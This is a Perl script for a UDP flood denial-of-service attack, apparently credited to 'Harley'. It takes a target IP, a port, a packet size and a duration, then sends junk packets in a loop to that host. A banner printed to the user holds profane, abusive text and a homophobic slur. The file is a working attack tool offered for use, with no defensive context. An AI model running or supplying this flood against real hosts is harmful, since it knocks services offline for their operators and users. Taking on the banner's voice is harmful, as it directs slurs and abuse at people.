#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# Harley <---
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD BLUE<<EOTEXT;

 ,ggg,        gg            ,ggg, ,ggggggggggg,          ,gggg,   ,ggggggg,  ,ggg,         gg 
dP""Y8b       88           dP""8IdP"""88""""""Y8,       d8" "8I ,dP""""""Y8bdP""Y8a        88 
Yb, `88       88          dP   88Yb,  88      `8b       88  ,dP d8'    a  Y8Yb, `88        88 
 `"  88       88         dP    88 `"  88      ,8P    8888888P"  88     "Y8P' `"  88        88 
     88aaaaaaa88        ,8'    88     88aaaad8P"        88      `8baaaa          88        88 
     88"""""""88        d88888888     88""""Yb,         88     ,d8P""""          88        88 
     88       88  __   ,8"     88     88     "8b   ,aa,_88     d8"               88       ,88 
     88       88 dP"  ,8P      Y8     88      `8i dP" "88P     Y8,               Y8b,___,d888 
     88       Y8,Yb,_,dP       `8b,   88       Yb,Yb,_,d88b,,_ `Yba,,_____,       "Y88888P"88,
     88       `Y8 "Y8P"         `Y8   88        Y8 "Y8P"  "Y88888`"Y8888888            ,ad8888
                                                                                      d8P" 88 
                                                                                    ,d8'   88 
                                                                                    d8'    88 
                                                                                    88     88 
                                                                                    Y8,_ _,88 
                                                                                     "Y888P"  
                                                                                                                                                                                      
Get Slammed By Harley! Fuck The World!
Harley Runs Youre Fucking Life! You Faggot!
EOTEXT

print "Fuck you up : $ip " . ($port ? $port : "random") . "
Getting Fucked with " .
  ($size ? "$size byte's" : "Error..") . "
  ~Call Me Daddy You Whore!~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}  